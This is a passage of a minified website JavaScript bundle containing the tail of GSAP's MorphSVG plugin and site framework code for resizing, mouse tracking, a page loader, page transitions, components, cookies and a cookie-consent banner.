r,n,s,o,a,h,u=t.length,l=wh,c=0,d=0;--u>-1;)for(h=(r=t[u]).length,a=0;a<h;a+=6)n=r[a]-e,s=r[a+1]-i,(o=xh(n*n+s*s))<l&&(l=o,c=r[a],d=r[a+1]);return[c,d]},kh=function(t,e,i,r,n,s){var o,a,h,u,l=e.length,c=0,d=Math.min(t.size||Ph(t),e[i].size||Ph(e[i]))*r,p=wh,f=t.centerX+n,g=t.centerY+s;for(o=i;o<l&&!((e[o].size||Ph(e[o]))<d);o++)a=e[o].centerX-f,h=e[o].centerY-g,(u=xh(a*a+h*h))<p&&(c=o,p=u);return u=e[c],e.splice(c,1),u},Gh=function(t,e){var i,r,n,s,o,a,h,u,l,c,d,p,f,g,m=0,v=t.length,_=e/((v-2)/6);for(f=2;f<v;f+=6)for(m+=_;m>.999999;)i=t[f-2],r=t[f-1],n=t[f],s=t[f+1],o=t[f+2],a=t[f+3],h=t[f+4],u=t[f+5],l=i+(n-i)*(g=1/((Math.floor(m)||1)+1)),l+=((d=n+(o-n)*g)-l)*g,d+=(o+(h-o)*g-d)*g,c=r+(s-r)*g,c+=((p=s+(a-s)*g)-c)*g,p+=(a+(u-a)*g-p)*g,t.splice(f,4,i+(n-i)*g,r+(s-r)*g,l,c,l+(d-l)*g,c+(p-c)*g,d,p,o+(h-o)*g,a+(u-a)*g),f+=6,v+=6,m--;return t},Hh=function(t,e,i,r,n){var s,o,a,h,u,l,c,d=e.length-t.length,p=d>0?e:t,f=d>0?t:e,g=0,m="complexity"===r?Nh:Mh,v="position"===r?0:"number"==typeof r?r:.8,_=f.length,y="object"==typeof i&&i.push?i.slice(0):[i],x="reverse"===y[0]||y[0]<0,E="log"===i;if(f[0]){if(p.length>1&&(t.sort(m),e.sort(m),p.size||Oh(p),f.size||Oh(f),l=p.centerX-f.centerX,c=p.centerY-f.centerY,m===Mh))for(_=0;_<f.length;_++)p.splice(_,0,kh(f[_],p,_,v,l,c));if(d)for(d<0&&(d=-d),p[0].length>f[0].length&&Gh(f[0],(p[0].length-f[0].length)/6|0),_=f.length;g<d;)p[_].size||Ph(p[_]),h=(a=Uh(f,p[_].centerX,p[_].centerY))[0],u=a[1],f[_++]=[h,u,h,u,h,u,h,u],f.totalPoints+=8,g++;for(_=0;_<t.length;_++)s=e[_],o=t[_],(d=s.length-o.length)<0?Gh(s,-d/6|0):d>0&&Gh(o,d/6|0),x&&!1!==n&&!o.reversed&&nh(o),(i=y[_]||0===y[_]?y[_]:"auto")&&(o.closed||Math.abs(o[0]-o[o.length-2])<.5&&Math.abs(o[1]-o[o.length-1])<.5?"auto"===i||"log"===i?(y[_]=i=Bh(o,s,!_||!1===n),i<0&&(x=!0,nh(o),i=-i),Fh(o,6*i)):"reverse"!==i&&(_&&i<0&&nh(o),Fh(o,6*(i<0?-i:i))):!x&&("auto"===i&&Math.abs(s[0]-o[0])+Math.abs(s[1]-o[1])+Math.abs(s[s.length-2]-o[o.length-2])+Math.abs(s[s.length-1]-o[o.length-1])>Math.abs(s[0]-o[o.length-2])+Math.abs(s[1]-o[o.length-1])+Math.abs(s[s.length-2]-o[0])+Math.abs(s[s.length-1]-o[1])||i%2)?(nh(o),y[_]=-1,x=!0):"auto"===i?y[_]=0:"reverse"===i&&(y[_]=-1),o.closed!==s.closed&&(o.closed=s.closed=!1));return E&&Ih("shapeIndex:["+y.join(",")+"]"),t.shapeIndex=y,y}},zh=function(t,e,i,r,n){var s=hh(t[0]),o=hh(t[1]);Hh(s,o,e||0===e?e:"auto",i,n)&&(t[0]=uh(s),t[1]=uh(o),"log"!==r&&!0!==r||Ih('precompile:["'+t[0]+'","'+t[1]+'"]'))},Vh=function(t,e){var i,r,n,s,o,a,h,u=0,l=parseFloat(t[0]),c=parseFloat(t[1]),d=l+","+c+" ",p=.999999;for(i=.5*e/(.5*(n=t.length)-1),r=0;r<n-2;r+=2){if(u+=i,a=parseFloat(t[r+2]),h=parseFloat(t[r+3]),u>p)for(o=1/(Math.floor(u)+1),s=1;u>p;)d+=(l+(a-l)*o*s).toFixed(2)+","+(c+(h-c)*o*s).toFixed(2)+" ",u--,s++;d+=a+","+h+" ",l=a,c=h}return d},Xh=function(t){var e=t[0].match(Sh)||[],i=t[1].match(Sh)||[],r=i.length-e.length;r>0?t[0]=Vh(e,r):t[1]=Vh(i,-r)},jh=function(t,e){for(var i,r,n,s,o,a,h,u,l,c,d,p,f=t.length,g=.2*(e||1);--f>-1;){for(d=(r=t[f]).isSmooth=r.isSmooth||[0,0,0,0],p=r.smoothData=r.smoothData||[0,0,0,0],d.length=4,u=r.length-2,h=6;h<u;h+=6)n=r[h]-r[h-2],s=r[h+1]-r[h-1],o=r[h+2]-r[h],a=r[h+3]-r[h+1],l=vh(s,n),c=vh(a,o),(i=Math.abs(l-c)<g)&&(p[h-2]=l,p[h+2]=c,p[h-1]=xh(n*n+s*s),p[h+3]=xh(o*o+a*a)),d.push(i,i,0,0,i,i);r[u]===r[0]&&r[u+1]===r[1]&&(n=r[0]-r[u-2],s=r[1]-r[u-1],o=r[2]-r[0],a=r[3]-r[1],l=vh(s,n),c=vh(a,o),Math.abs(l-c)<g&&(p[u-2]=l,p[2]=c,p[u-1]=xh(n*n+s*s),p[3]=xh(o*o+a*a),d[u-2]=d[u-1]=!0))}return t},$h=function(t){var e=t.trim().split(" ");return{x:(~t.indexOf("left")?0:~t.indexOf("right")?100:isNaN(parseFloat(e[0]))?50:parseFloat(e[0]))/100,y:(~t.indexOf("top")?0:~t.indexOf("bottom")?100:isNaN(parseFloat(e[1]))?50:parseFloat(e[1]))/100}},Wh="Use MorphSVGPlugin.convertToPath() to convert to a path before morphing.",Yh=function(t,e,i,r){var n,s,o,a=this._origin,h=this._eOrigin,u=t[i]-a.x,l=t[i+1]-a.y,c=xh(u*u+l*l),d=vh(l,u);return u=e[i]-h.x,l=e[i+1]-h.y,s=(o=n=vh(l,u)-d)!=o%Eh?o+(o<0?bh:-bh):o,!r&&dh&&Math.abs(s+dh.ca)<Th&&(r=dh),this._anchorPT=dh={_next:this._anchorPT,t:t,sa:d,ca:r&&s*r.ca<0&&Math.abs(s)>Dh?n:s,sl:c,cl:xh(u*u+l*l)-c,i:i}},qh=function(t){lh=gh(),fh=fh||lh&&lh.plugins.morphSVG,lh&&fh?(ch=lh.utils.toArray,document,fh.prototype._tweenRotation=Yh,ph=1):t&&Ih("Please gsap.registerPlugin(MorphSVGPlugin)")},Zh={version:"3.10.4",name:"morphSVG",rawVars:1,register:function(t,e){lh=t,fh=e,qh()},init:function(t,e,i,r,n){if(ph||qh(1),!e)return Ih("invalid shape"),!1;var s,o,a,h,u,l,c,d,p,f,g,m,v,_,y,x,E,b,T,D,w,S;if(mh(e)&&(e=e.call(i,r,t,n)),"string"==typeof e||e.getBBox||e[0])e={shape:e};else if("object"==typeof e){for(o in s={},e)s[o]=mh(e[o])&&"render"!==o?e[o].call(i,r,t,n):e[o];e=s}var A=t.nodeType?window.getComputedStyle(t):{},C=A.fill+"",I=!("none"===C||"0"===(C.match(Sh)||[])[3]||"evenodd"===A.fillRule),R=(e.origin||"50 50").split(",");if(u="POLYLINE"===(s=(t.nodeName+"").toUpperCase())||"POLYGON"===s,"PATH"!==s&&!u&&!e.prop)return Ih("Cannot morph a <"+s+"> element. "+Wh),!1;if(o="PATH"===s?"d":"points",!e.prop&&!mh(t.setAttribute))return!1;if(h=function(t,e,i){var r,n;return(!("string"==typeof t)||Ah.test(t)||(t.match(Sh)||[]).length<3)&&((r=ch(t)[0])?(n=(r.nodeName+"").toUpperCase(),e&&"PATH"!==n&&(r=oh(r,!1),n="PATH"),t=r.getAttribute("PATH"===n?"d":"points")||"",r===i&&(t=r.getAttributeNS(null,"data-original")||t)):(Ih("WARNING: invalid morph to: "+t),t=!1)),t}(e.shape||e.d||e.points||"","d"===o,t),u&&Ch.test(h))return Ih("A <"+s+"> cannot accept path data. "+Wh),!1;if(l=e.shapeIndex||0===e.shapeIndex?e.shapeIndex:"auto",c=e.map||Zh.defaultMap,this._prop=e.prop,this._render=e.render||Zh.defaultRender,this._apply="updateTarget"in e?e.updateTarget:Zh.defaultUpdateTarget,this._rnd=Math.pow(10,isNaN(e.precision)?2:+e.precision),this._tween=i,h){if(this._target=t,E="object"==typeof e.precompile,f=this._prop?t[this._prop]:t.getAttribute(o),this._prop||t.getAttributeNS(null,"data-original")||t.setAttributeNS(null,"data-original",f),"d"===o||this._prop){if(f=hh(E?e.precompile[0]:f),g=hh(E?e.precompile[1]:h),!E&&!Hh(f,g,l,c,I))return!1;for("log"!==e.precompile&&!0!==e.precompile||Ih('precompile:["'+uh(f)+'","'+uh(g)+'"]'),(w="linear"!==(e.type||Zh.defaultType))&&(f=jh(f,e.smoothTolerance),g=jh(g,e.smoothTolerance),f.size||Oh(f),g.size||Oh(g),D=$h(R[0]),this._origin=f.origin={x:f.left+D.x*f.width,y:f.top+D.y*f.height},R[1]&&(D=$h(R[1])),this._eOrigin={x:g.left+D.x*g.width,y:g.top+D.y*g.height}),this._rawPath=t._gsRawPath=f,v=f.length;--v>-1;)for(y=f[v],x=g[v],d=y.isSmooth||[],p=x.isSmooth||[],_=y.length,dh=0,m=0;m<_;m+=2)x[m]===y[m]&&x[m+1]===y[m+1]||(w?d[m]&&p[m]?(b=y.smoothData,T=x.smoothData,S=m+(m===_-4?7-_:5),this._controlPT={_next:this._controlPT,i:m,j:v,l1s:b[m+1],l1c:T[m+1]-b[m+1],l2s:b[S],l2c:T[S]-b[S]},a=this._tweenRotation(y,x,m+2),this._tweenRotation(y,x,m,a),this._tweenRotation(y,x,S-1,a),m+=4):this._tweenRotation(y,x,m):(a=this.add(y,m,y[m],x[m]),a=this.add(y,m+1,y[m+1],x[m+1])||a))}else a=this.add(t,"setAttribute",t.getAttribute(o)+"",h+"",r,n,0,function(t){return isNaN(t)?Xh:function(e){Xh(e),e[1]=function(t,e){if(!e)return t;var i,r,n,s=t.match(Sh)||[],o=s.length,a="";for("reverse"===e?(r=o-1,i=-2):(r=(2*(parseInt(e,10)||0)+1+100*o)%o,i=2),n=0;n<o;n+=2)a+=s[r-1]+","+s[r]+" ",r=(r+i)%o;return a}(e[1],parseInt(t,10))}}(l),o);w&&(this.add(this._origin,"x",this._origin.x,this._eOrigin.x),a=this.add(this._origin,"y",this._origin.y,this._eOrigin.y)),a&&(this._props.push("morphSVG"),a.end=h,a.endProp=o)}return 1},render:function(t,e){for(var i,r,n,s,o,a,h,u,l,c,d,p,f=e._rawPath,g=e._controlPT,m=e._anchorPT,v=e._rnd,_=e._target,y=e._pt;y;)y.r(t,y.d),y=y._next;if(1===t&&e._apply)for(y=e._pt;y;)y.end&&(e._prop?_[e._prop]=y.end:_.setAttribute(y.endProp,y.end)),y=y._next;else if(f){for(;m;)o=m.sa+t*m.ca,s=m.sl+t*m.cl,m.t[m.i]=e._origin.x+_h(o)*s,m.t[m.i+1]=e._origin.y+yh(o)*s,m=m._next;for(r=t<.5?2*t*t:(4-2*t)*t-1;g;)p=(a=g.i)+(a===(n=f[g.j]).length-4?7-n.length:5),o=vh(n[p]-n[a+1],n[p-1]-n[a]),c=yh(o),d=_h(o),u=n[a+2],l=n[a+3],s=g.l1s+r*g.l1c,n[a]=u-d*s,n[a+1]=l-c*s,s=g.l2s+r*g.l2c,n[p-1]=u+d*s,n[p]=l+c*s,g=g._next;if(_._gsRawPath=f,e._apply){for(i="",h=0;h<f.length;h++)for(s=(n=f[h]).length,i+="M"+(n[0]*v|0)/v+" "+(n[1]*v|0)/v+" C",a=2;a<s;a++)i+=(n[a]*v|0)/v+" ";e._prop?_[e._prop]=i:_.setAttribute("d",i)}}e._render&&f&&e._render.call(e._tween,f,_)},kill:function(t){this._pt=this._rawPath=0},getRawPath:function(t){var e,i=(t=th(t)&&Ya.test(t)&&document.querySelector(t)||t).getAttribute?t:0;return i&&(t=t.getAttribute("d"))?(i._gsPath||(i._gsPath={}),(e=i._gsPath[t])&&!e._dirty?e:i._gsPath[t]=hh(t)):t?th(t)?hh(t):eh(t[0])?[t]:t:console.warn("Expecting a <path> element or an SVG path data string")},stringToRawPath:hh,rawPathToString:uh,normalizeStrings:function(t,e,i){var r=i.shapeIndex,n=i.map,s=[t,e];return zh(s,r,n),s},pathFilter:zh,pointsFilter:Xh,getTotalSize:Oh,equalizeSegmentQuantity:Hh,convertToPath:function(t,e){return ch(t).map((function(t){return oh(t,!1!==e)}))},defaultType:"linear",defaultUpdateTarget:!0,defaultMap:"size"};gh()&&lh.registerPlugin(Zh);const Kh=i(729);class Qh{constructor(){this.e=null,this.E={}}on(t,e,i){null===this.e&&(this.e=new Kh),this.e.on(t,e,i)}once(t,e,i){null===this.e&&(this.e=new Kh),this.e.once(t,e,i)}off(t,e,i){if(!gu.IS_PROD&&void 0===this.e._events[t])return void console.warn(`You're trying to kill a event from "${i.constructor.name}" that doesn't exist, which refer to the following fonction:\n\n${e}`);const r=this.e._events[t].length;this.e.removeListener(t,e,i),gu.IS_PROD||void 0===this.e._events[t]||r!=this.e._events[t].length||console.warn(`The "${t}" event, added in ${i.constructor.name}, wasn't destroy.`)}emit(t,e){null!==this.e&&this.e.emit(t,e)}}const Jh=new class{constructor(){this.IS_TOUCH=null}init(t=$("html")){this._initDOM(t),this._initEl()}_initDOM(t){this.$html=t}_initEl(){this._setValues(),this._setBodyClass()}_setValues(){this.IS_TOUCH=ScrollTrigger.isTouch}_setBodyClass(){this.IS_TOUCH?this.$html[0].classList.add("touch"):this.$html[0].classList.add("notouch")}};class tu{static getElPos(t,e,i,r){const n=t/e,s={x:0,y:0,w:0,h:0};return n<i/r?(s.w=i,s.h=Math.round(s.w/n),s.y=Math.round(-(s.h-r)/2)):(s.h=r,s.w=Math.round(s.h*n),s.x=Math.round(-(s.w-i)/2)),s}static getCropPos(t,e,i,r){const n=i/r,s={x:0,y:0,w:0,h:0};return t/e<n?(s.w=t,s.h=Math.round(s.w/n),s.y=Math.round(-(s.h-e)/2)):(s.h=e,s.w=Math.round(s.h*n),s.x=Math.round(-(s.w-t)/2)),s}static degToRad(t){return t*Math.PI/180}static radToDeg(t){return 180*t/Math.PI}static getHypotenuse(t,e){return Math.sqrt(t*t+e*e)}static getInertia(t,e,i,r=!0,n=.01){return e+(!r||r&&Math.abs((t-e)*i)>=n?(t-e)*i:t-e)}static mapRange(t,e,i,r,n){return r+(t-e)*(n-r)/(i-e)}static clamp(t,e,i){return Math.min(Math.max(t,e),i)}}const eu=new class extends Qh{constructor(){super(),this.E={RESIZE:"resize",WINDOW_OUT:"windowout",WINDOW_IN:"windowin",ORIENTATION_CHANGE:"orientationchange"},this.eh={},this.MOBILE_WIDTH_MAX=939,this.MOBILE_HEIGHT_MAX=599,this.PHONE_WIDTH_MAX=559,this.IS_DESKTOP=null,this.IS_MOBILE=null,this.IS_TABLET=null,this.IS_PHONE=null,this.DPR=window.devicePixelRatio,this.wW=null,this.wH=null,this.bW=null,this.bH=null,this.cX=null,this.cY=null,this.vR=null,this.hypo=null,this.pbW=null,this.canResize=!0,this.hasRequestedResize=!1,this.isWindowFocused=!0}init(t=$(window),e=$(document.body),i=e){this._initDOM(t,e,i),this._initEl(),this._bindEvents(),this._processResize()}_initDOM(t,e,i){this.$window=t,this.$body=e,this.$pageWrap=i}_initEl(){}_bindEvents(){this.eh.resize=this._resize.bind(this),this.$window.on("resize",this.eh.resize)}_resize(){this.canResize?(window.requestAnimationFrame((()=>{this._processResize(),this.canResize=!1})),this.stoResize=setTimeout((()=>{this.hasRequestedResize&&(this.hasRequestedResize=!1,this._processResize()),this.canResize=!0}),300)):this.hasRequestedResize=!0}_processResize(){this._setResizeProps(),this._setValues();const t=Jh.IS_TOUCH&&this.pbW==this.bW;this.emit(this.E.RESIZE,t),this.pbW=this.bW}_setResizeProps(){this.wW=this.$window.innerWidth(),this.wH=this.$window.outerHeight(),this.bW=this.$body.width(),this.bH=this.$body.height(),this.cX=Math.round(this.bW/2),this.cY=Math.round(this.wH/2),this.vR=this.bW/this.wH,this.hypo=Math.ceil(tu.getHypotenuse(this.bW,this.wH)),this._setVar()}_setVar(){const t=.01*this.wH;document.documentElement.style.setProperty("--vh",`${t}px`)}_setValues(){this.IS_MOBILE=this.bW<=this.MOBILE_WIDTH_MAX||this.wH<=this.MOBILE_HEIGHT_MAX,this.IS_PHONE=this.bW<=this.PHONE_WIDTH_MAX||this.wH<=this.PHONE_WIDTH_MAX,this.IS_TABLET=this.IS_MOBILE&&!this.IS_PHONE,this.IS_DESKTOP=!this.IS_MOBILE}_windowOut(){this.isWindowFocused=!1,this.emit(this.E.WINDOW_OUT)}_windowIn(){this.isWindowFocused=!0,this.emit(this.E.WINDOW_IN)}},iu=new class extends Qh{constructor(){super(),this.E={MOUSE_MOVE:"mousemove",MOUSE_DOWN:"mousedown",MOUSE_UP:"mouseup"},this.eh={},this.x=null,this.y=null,this.xI=null,this.yI=null,this.xI2=null,this.yI2=null,this.MOUSE_INERTIA=.005,this.MOUSE_INERTIA2=.03}init(t=$(window),e=Math.round(t.width()/2),i=Math.round(t.height()/2)){this._initDOM(t),this._initEl(e,i),this._bindEvents()}_initDOM(t){this.$window=t}_initEl(t,e){this.setPosition(t,e)}_bindEvents(){du.on(du.E.RAF,this._raf,this),this.eh.mouseMove=this._mouseMove.bind(this),this.$window.on("mousemove",this.eh.mouseMove),this.eh.mouseDown=this._mouseDown.bind(this),this.$window.on("mousedown",this.eh.mouseDown),this.eh.mouseUp=this._mouseUp.bind(this),this.$window.on("mouseup",this.eh.mouseUp)}_raf(){this.xI=tu.getInertia(this.x,this.xI,this.MOUSE_INERTIA),this.yI=tu.getInertia(this.y,this.yI,this.MOUSE_INERTIA),this.xI2=tu.getInertia(this.x,this.xI2,this.MOUSE_INERTIA2),this.yI2=tu.getInertia(this.y,this.yI2,this.MOUSE_INERTIA2)}_mouseMove(t){this.x=t.clientX,this.y=t.clientY,this.emit(this.E.MOUSE_MOVE)}_mouseDown(){this.emit(this.E.MOUSE_DOWN)}_mouseUp(){this.emit(this.E.MOUSE_UP)}setPosition(t,e){this.x=t,this.y=e,this.xI=t,this.yI=e}};class ru extends Qh{constructor(){super(),this.eh={},this.tw={},this.tl={},this.sto={},this.si={},this.df={},this.isInit=!1}get isInit(){return this._isInit}set isInit(t){this._isInit=t,t&&this.resize()}init(t=null,e){this.initDOM(t),this.initEl(e),this.initTl(),this.bindEvents(),this.resize()}initDOM(t){}initEl(t){}initTl(){}bindEvents(){}unbindEvents(){}show(){}hide(){}resize(t=!1){}raf(){}destroy(){this.unbindEvents(),this.destroyGSAP(),this.destroyTimer()}destroyGSAP(){for(const t in this.tw)this.killTween(t);for(const t in this.tl)this.killTimeline(t);this.tl={},this.tw={}}killTween(t){this.tw[t]?(this.tw[t].kill(),this.tw[t]=null):gu.IS_PROD||console.warn(`You're trying to kill a tween named "${t}" that doesn't exist.`)}killTimeline(t){this.tl[t]?(this.tl[t].pause(),this.tl[t].clear(),this.tl[t].kill(),this.tl[t]=null):gu.IS_PROD||console.warn(`You're trying to kill a timeline named "${t}" that doesn't exist.`)}destroyTimer(){for(const t in this.sto)clearTimeout(this.sto[t]);for(const t in this.si)clearInterval(this.si[t])}}const nu=new class extends ru{constructor(){super(),this.needsToClose=!0,this.previousWord=!1,this.currentWord=0}set display(t){this.$mainLoader[0].style.display=t?"":"none"}initDOM(){this.$mainLoader=$(document.getElementById("main_loader")),this.$background=this.$mainLoader.find(".ml--background"),this.$wordsWrapper=this.$mainLoader.find(".ml--words"),this.$words=this.$wordsWrapper.children(),this.numWords=this.$words.length,this.previousWord=this.numWords}initEl(){gsap.set(this.$words,{y:100,opacity:0}),this._nextWord()}_nextWord(){this.needsToClose?(gsap.set(this.$background,{opacity:0}),gsap.timeline().set(this.$words[this.currentWord],{opacity:0,y:-100}).add((()=>{this.needsToClose=!1,this._onHideComplete()}),.5)):(this.previousWord=this.currentWord,this.currentWord=this.currentWord+1,this.currentWord===this.numWords-1&&(this.currentWord=0),gsap.timeline().set(this.$words[this.previousWord],{opacity:0,y:-100}).set(this.$words[this.currentWord],{opacity:1,y:0},.4).set(this.$words[this.previousWord],{y:100,opacity:0},1).add((()=>{this._nextWord()}),1))}show(t){return this.display=!0,this.df.show=fu.Deferred(),t?this._onShowComplete():(this._nextWord(),this.tl.show=gsap.timeline({onComplete:this._onShowComplete.bind(this)}).set(this.$background,{opacity:1},0).add((()=>{}),.5)),this.df.show.promise}_onShowComplete(){this.df.show.resolve()}hide(t,e=null){return this.df.hide=fu.Deferred(),t?(this.needsToClose=!0,this._onHideComplete(),this.df.hide.promise):(this.tl.show&&this.tl.show.isActive()?this.tl.show.eventCallback("onComplete",(()=>{this.tl.show.eventCallback("onComplete",null),this.needsToClose=!0})):this.needsToClose=!0,this.df.hide.promise)}_onHideComplete(t){this.display=!1,this.df.hide.resolve()}},su=new class extends Qh{constructor(){super(),this.E={INIT_BLOCKS:"init_blocks",DESTROY_BLOCKS:"destroy_blocks",TRANSITION_COMPLETE:"transition_complete"}}out(t,e,i,r,n){const s=fu.Deferred();return this._playOut(s,t,e,i,r,n),s.promise}_playOut(t,e,i,r,n,s){const o=this._getDelay(e,i,r.id,n.id);e||pu.scrollTo(0),Promise.all([nu.hide(e)]).then((()=>{r.page.show(i.transState,o,e,s),this._onOutComplete(t,e,i,r,n)})),this.emit(this.E.INIT_BLOCKS)}_onOutComplete(t,e,i,r,n){pu.pauseSmooth(!1),this.emit(this.E.TRANSITION_COMPLETE,e),t.resolve()}in(t,e,i,r,n){const s=fu.Deferred();return this._playIn(s,t,e,i,r,n),s.promise}_playIn(t,e,i,r,n,s){const o=r.$dom;Promise.all([nu.show(e)]).then((()=>{this._onInComplete(t,o)}))}_onInComplete(t,e){this.emit(this.E.DESTROY_BLOCKS,e),t.resolve()}_getDelay(t,e,i,r){return e.transState,0}_getScrollTo(t,e){return 0}},ou=new class extends Qh{constructor(){super(),this.classes={}}init(){this._bindEvents()}register(t,e){this.classes[t]=e}update(t){t.find("[data-component]").not("[data-component-init]").each(((t,e)=>this._addComponent(e)))}destroy(t){t._LA_componentJsClass&&t._LA_componentJsClass.length>0&&t._LA_componentJsClass.map((t=>{t.destroy()}))}_bindEvents(){su.on(su.E.INIT_BLOCKS,this._init,this),su.on(su.E.DESTROY_BLOCKS,this._destroy,this)}_init(){du.$body.find("[data-component]").not("[data-component-init]").each(((t,e)=>this._addComponent(e)))}_addComponent(t){const e=t.getAttribute("data-component").split(" ");t._LA_componentJsClass=[],e.map((e=>{this.classes[e]?(t.setAttribute("data-component-init",!0),t._LA_componentJsClass.push(new this.classes[e]($(t)))):console.warn('Components | Class "'+e+'"" not found')}))}_destroy(t){t.find("[data-component-init]").each(((t,e)=>{e._LA_componentJsClass.map((t=>{t.destroy(),t=null}))}))}},au=new class{constructor(){this.HAS_FPS_STATS=!1,this.HAS_MEMORY_STATS=!1,this.scripts={fpsStats:{name:"FPSStats",scripts:{library:{url:"vendor/stats.js",loaded:!1},util:{url:"app/utils/debug/FPSStats.js",loaded:!1}}},memoryStats:{name:"MemoryStats",scripts:{library:{url:"vendor/memory-stats.js",loaded:!1},util:{url:"app/utils/debug/MemoryStats.js",loaded:!1}}},datGUI:{name:"DatGUI",scripts:{library:{url:"vendor/dat.gui.js",loaded:!1},util:{url:"app/utils/debug/DatGUI.js",loaded:!1}}}}}init(){this._loadFPSStatsScripts(gu.DEBUG.FPS_STATS),this._loadMemoryStatsScripts(gu.DEBUG.MEMORY_STATS),this._loadDatGUIScripts(gu.DEBUG.DEBUG_STATS)}_loadFPSStatsScripts(t){t&&gu.IS_DEV&&this._addScript(this.scripts.fpsStats)}_loadMemoryStatsScripts(t){t&&gu.IS_DEV&&this._addScript(this.scripts.memoryStats)}_loadDatGUIScripts(t){t&&gu.IS_DEV&&this._addScript(this.scripts.datGUI)}_addScript(t){const e=t.scripts;for(const i in e){const r=e[i],n=document.createElement("script");n.onload=()=>{r.loaded=!0,this._checkScriptsLoading(t)},n.src=gu.THEME_URL+"/assets/src/js/"+r.url,document.body.appendChild(n)}}_checkScriptsLoading(t){"FPSStats"==t.name&&t.scripts.library.loaded&&t.scripts.util.loaded?this._initFPSStats():"MemoryStats"==t.name&&t.scripts.library.loaded&&t.scripts.util.loaded?this._initMemoryStats():"DatGUI"==t.name&&t.scripts.library.loaded&&t.scripts.util.loaded&&this._initDatGUI()}_initFPSStats(){this.fpsStats=LA_FPSStats,this.fpsStats.init(),this.HAS_FPS_STATS=!0}_initMemoryStats(){this.memoryStats=LA_MemoryStats,this.memoryStats.init(),this.HAS_MEMORY_STATS=!0}_initDatGUI(){this.datGUI=LA_DatGUI,this.datGUI.init()}rafStart(){this.HAS_FPS_STATS&&gu.IS_DEV&&this.fpsStats.begin()}rafEnd(){this.HAS_FPS_STATS&&gu.IS_DEV&&this.fpsStats.end(),this.HAS_MEMORY_STATS&&gu.IS_DEV&&this.memoryStats.update()}};function hu(t){for(var e=1;e<arguments.length;e++){var i=arguments[e];for(var r in i)t[r]=i[r]}return t}const uu=function t(e,i){function r(t,r,n){if("undefined"!=typeof document){"number"==typeof(n=hu({},i,n)).expires&&(n.expires=new Date(Date.now()+864e5*n.expires)),n.expires&&(n.expires=n.expires.toUTCString()),t=encodeURIComponent(t).replace(/%(2[346B]|5E|60|7C)/g,decodeURIComponent).replace(/[()]/g,escape);var s="";for(var o in n)n[o]&&(s+="; "+o,!0!==n[o]&&(s+="="+n[o].split(";")[0]));return document.cookie=t+"="+e.write(r,t)+s}}return Object.create({set:r,get:function(t){if("undefined"!=typeof document&&(!arguments.length||t)){for(var i=document.cookie?document.cookie.split("; "):[],r={},n=0;n<i.length;n++){var s=i[n].split("="),o=s.slice(1).join("=");try{var a=decodeURIComponent(s[0]);if(r[a]=e.read(o,a),t===a)break}catch(t){}}return t?r[t]:r}},remove:function(t,e){r(t,"",hu({},e,{expires:-1}))},withAttributes:function(e){return t(this.converter,hu({},this.attributes,e))},withConverter:function(e){return t(hu({},this.converter,e),this.attributes)}},{attributes:{value:Object.freeze(i)},converter:{value:Object.freeze(e)}})}({read:function(t){return'"'===t[0]&&(t=t.slice(1,-1)),t.replace(/(%[\dA-F]{2})+/gi,decodeURIComponent)},write:function(t){return encodeURIComponent(t).replace(/%(2[346BF]|3[AC-F]|40|5[BDE]|60|7[BCD])/g,decodeURIComponent)}},{path:"/"}),lu=new class extends ru{constructor(){super(),this.isActive=!1}init(t=null){this.initDOM(t),0!=this.$wrapper.length&&(this.isActive=!0,this.initEl(),this.initTl(),this.bindEvents(),this.resize())}initDOM(){super.initDOM(),this.$wrapper=$("#infos_message"),this.$inner=this.$wrapper.find(".infos_message_inner"),this.$close=this.$inner.find(".infos_message--close")}initEl(){super.initEl(),this.id="infos_message-accepted__"+this.$wrapper[0].getAttribute("data-id"),this.hasCookie="true"===uu.get(this.id)}bindEvents(){super.bindEvents(),this.eh.clickBtn=this._hide.bind(this),this.$close.on("click",this.eh.clickBtn)}show(t=!1){this.isActive&&(this.hasCookie||(this.$wrapper[0].style.display="block"),t&&(this.tl.show=gsap.timeline().from(this.$wrapper,{duration:.3,yPercent:100},0).from(this.$inner,{duration:.3,yPercent:-100},0)))}_hide(){uu.set(this.id,"true",{expires:30}),this.tl.hide=gsap.timeline({onComplete:this._onHideComplete.bind(this)}).to(this.$wrapper,{duration:.3,yPercent:100},0).to(this.$inner,{duration:.3,yPercent:-100},0)}_onHideComplete(){this.$wrapper[0].style.display="none"}},cu=new class extends ru{constructor(){super()}initDOM(){super.initDOM(),this.$wrapper=$("#seikooc"),this.$btnAccept=this.$wrapper.find(".seikooc--btn__accept"),this.$btnRefuse=this.$wrapper.find(".seikooc--btn__refuse")}bindEvents(){super.bindEvents(),this.eh.clickBtnAccept=this._accept.bind(this),this.$btnAccept.on("click",this.eh.clickBtnAccept),this.eh.clickBtnRefuse=this._refuse.bind(this),this.$btnRefuse.on("click",this.eh.clickBtnRefuse)}checkCookiesAccepted(){const t=uu.get("cookies-has_accepted");void 0===t?this.$wrapper[0].style.display="block":"true"===t?(this._activateScripts(),lu.show()):"false"===t&&lu.show()}_refuse(){this._setCookiesAcceptance("false"),this._hide()}_accept(){this._setCookiesAcceptance("true"),this._activateScripts(),this._hide()}_setCookiesAcceptance(t){uu.set("cookies-has_accepted",t,{expires:30})}_activateScripts(){du.$html.find("script.cookies_to_accept").each(((t,e)=>{if(e.src){const t=e.src;e.src="",e.type="text/javascript",e.src=t}else{const t=e.innerText.replace(/(\r\n|\n|\r|\t)/gm,"");e.innerText="",e.type="text/javascript",e.innerText=t}}))}_hide(){this.tl.hide=gsap.timeline({onComplete:this._onHideComplete.bind(this)}).to(this.$wrapper,{duration:.3,x:20,opacity:0,ease:"power2.out"},0)}_onHideComplete(){this.$wrapper[0].style.display="none",lu.show(!0)}},du=new class extends Qh{constructor(){super(),this.E={INIT_STATIC_VIEW:"init_static_view",RAF:"raf"},this.INERTIA=.09}init(){const t=fu.Deferred();return this._initDOM(),this._initEl(),this._bindEvents(),this._initStaticViews(),this._resize(),t.resolve(),t.promise}_initDOM(){this.$window=$(window),this.$html=$("html"),this.$title=this.$html.find("head 